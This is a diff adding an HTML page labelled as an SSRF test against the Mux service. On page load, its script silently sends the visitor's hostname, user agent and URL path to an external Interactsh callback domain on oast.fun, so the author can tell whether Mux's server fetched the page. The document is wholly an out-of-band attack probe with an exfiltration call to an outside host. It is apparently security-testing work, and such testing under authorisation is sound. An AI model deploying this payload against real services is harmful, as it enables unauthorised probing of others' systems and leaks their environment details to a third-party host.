@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Mux SSRF Test</title>
+    <script>
+        // Function to send a "ping" to your Interactsh server
+        function logVisit() {
+            // Use fetch API to send a request to Interactsh
+            // We use fetch with 'no-cors' to avoid CORS issues, even though it's a simple GET
+            fetch('https://qqbatpnjqjnadljurlznc3gsxop1cg1wy.oast.fun/?log=visited&host=' + encodeURIComponent(window.location.hostname) + '&useragent=' + encodeURIComponent(navigator.userAgent) + '&path=' + encodeURIComponent(window.location.pathname), {
+                mode: 'no-cors' // This is key for making the request from any page
+            })
+            .then(() => console.log("Visit logged to Interactsh."))
+            .catch(err => console.error("Error logging visit:", err));
+        }
+        // Run the function as soon as the page loads
+        window.onload = logVisit;
+    </script>
+</head>
+<body>
+    <h1>SSRF Test Page</h1>
+    <p>This page is a test for SSRF. If the Mux server fetches this URL, it will trigger a request to my Interactsh server.</p>
+    <p>Check your Interactsh logs for a new HTTP request.</p>
+</body>
+</html>
